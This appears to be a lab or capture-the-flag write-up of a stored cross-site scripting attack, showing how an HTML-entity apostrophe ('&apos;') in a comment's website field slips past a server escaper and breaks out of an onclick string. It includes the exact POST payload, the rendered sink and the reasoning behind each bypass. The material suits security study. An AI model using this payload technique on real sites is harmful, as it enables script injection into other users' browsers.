# Attack Chain — Entity-smuggled quote breakout in stored onclick

## The sink template (revealed by benign store)
```html
<a id="author" href="WEBSITE" onclick="var tracker={track(){}};tracker.track('WEBSITE');">NAME</a>
```
Server encoding of WEBSITE (verified): `'`→`\'`, `"`→`&quot;`, `<>`→entities,
`\`→`\\`, **`&`→`&` RAW**.

## Data flow
```
Attacker (own session): POST /post/comment { …, website="http://click.example.com/?&apos;-alert(1)-&apos;" }
    → 302 → stored VERBATIM (entities intact — & untouched by escaper)
   │
   ▼
Any viewer GETs the post → server renders:
    onclick="var tracker={track(){}};tracker.track('http://click.example.com/?&apos;-alert(1)-&apos;');"
   │
   ▼
[DECODE STAGE — TRUST BOUNDARY CROSSED] victim HTML parser computes the attribute
value, decoding &apos;→':  tracker.track('http://click.example.com/?'-alert(1)-'');
   │  the escaper ran at STORE time; decoding runs at RENDER time, AFTER it —
   │  the encoded charset reconstitutes downstream of the defense
   ▼
[SINK] viewer clicks the author name → handler runs:
string 'http://…/?' − alert(1) FIRES − string '' → valid expression statement
   ▼
RESULT: alert(1) in viewer origin (href navigation follows after dialog dismissal)
```

## Per-field map (this build)
| Field | Rendered as | Encoding | Verdict |
|---|---|---|---|
| `website` | `href` + `onclick` tracker string | `'"<>` handled, `\` doubled, `&` raw | **SINK — via `&apos;`** |
| `name` | anchor text | (fully encoded per prior-build pattern; not the vector) | dead |
| `comment` | paragraph | (encoded) | dead |
| `email` | not reflected | — | no sink |

## Why `&apos;-alert(1)-&apos;` (constraint-satisfying)
- Direct `'` arrives `\'` (string content) — needs the entity detour.
- `"` arrives `&quot;` (inert text) — no double-quote breakout.
- `<>` arrive entities — no tag breakout.
- `\` doubled — no escape-shift (contrast the reflected backslash lab).
- `&` raw is the SOLE survivor — and `&apos;` decodes to exactly the needed `'`.
- Inner payload quoteless (`alert(1)`) — server escapes inner quotes, so balanced
  inner strings die; numeric/quoteless markers only.
- Parenthesization unnecessary here (call-operand, not assignment) — but the
  `-(x=1)` paren rule was re-verified live when the title-marker needed it.

## Expected response sequence (verified)
1. `POST /post/comment` → 302; re-GET shows entities verbatim in both reflections.
2. CDP: decoded `onclick` value shows live breakout structure; sync click+read
   proves execution before href-navigation destroys evidence.
3. Real-browser click → `alert(1)` → `is-solved`.